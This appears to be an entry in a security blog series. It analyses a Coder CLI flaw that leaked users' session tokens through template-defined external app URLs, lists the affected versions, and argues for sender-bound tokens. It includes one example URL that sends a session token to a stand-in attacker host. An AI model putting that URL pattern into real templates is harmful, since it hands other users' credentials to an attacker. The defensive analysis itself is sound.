# Sixty-Three Token Thefts, One Missing Control

## The incident

Coder's `coder open app` substituted the user's real session token
into template-defined external app URLs without validating the URL's
scheme or destination (CVE-2026-137546, MEDIUM 6.1, published
2026-11-26). A template author could set an external app's URL to
`https://attacker.example/?t=$SESSION_TOKEN` — or an IDE link
pointing at another server — and collect the session token of any
user who opened the app from the CLI, then act as that user, with
that user's permissions, until the token expires. Shared-with users
and administrators helping with a workspace were the prize targets.

- Affected: Coder 2.29.17 before 2.29.27, 2.32.7 before 2.33.0,
  2.33.8 before 2.34.0, 2.34.2 before 2.34.19, 2.35.0 before
  2.37.11, 2.38.0 before 2.38.7, 2.39.0 before 2.39.1; fixed in
  2.39.1 / 2.38.7 / 2.37.11 / 2.34.19 / 2.29.27 (the CLI now adds
  the token only to known Coder IDE handlers for this deployment).
- Sources: NVD record (CVE-2026-137546); GitHub Security Advisory
  GHSA-6g9g-vmp7-r45p
  https://github.com/coder/coder/security/advisories/GHSA-6g9g-vmp7-r45p
  (reported by Anthropic's Security Team and Ada Logics; a
  follow-up to CVE-2026-55431, which fixed the same flaw for
  workspace-registered apps but left template-defined apps
  trusted); VulnCheck advisory
  https://www.vulncheck.com/advisories/coder-from-2.39.0-before-2.39.1-session-token-leak-via-coder-open-app.

## Why it's DPoP-shaped

The stolen-session-token replay shape, previously seen in Open
WebUI's postMessage harvest (#5), its cookie-jar forwarding (#7),
Mattermost's OAuth session switch (#10), and GitLab's dependency
proxy cookie disclosure (#56) — the token leaves the holder's
hands through a channel the holder did not choose, and the string
alone is enough to become the victim. A sender-bound session token
would be inert on the attacker's server: the template author
collects a string that fails every proof check, because the proof
key never left the victim's machine. The patch stops the leak at
the CLI; binding makes the next leak a non-event.

## Notes / honesty checks

- The stolen credential is a Coder session token, not an OAuth
  access token — the angle is sender-bound issuance as the shape
  of the fix, not a pydpop plug.
- The advisory is candid about the trust boundary, and the series
  records it: template authors are a trusted role — they already
  control what runs in every workspace built from their templates
  and already receive the workspace owner's token. What this flaw
  added was *other* users' tokens (shared users, helping admins),
  and the victim has to run `coder open app` on the malicious app
  (the dashboard never had the flaw on fixed releases). MEDIUM,
  not HIGH, for exactly that reason — but the class is the
  series' class, and the fix is the series' fix.
- Coder disclosed a sibling the same day — database errors
  containing temporary AWS IAM credentials (CVE-2026-137547,
  HIGH 8.1) — recorded in the watch log; static-credential
  disclosure in error text, not DPoP-shaped.
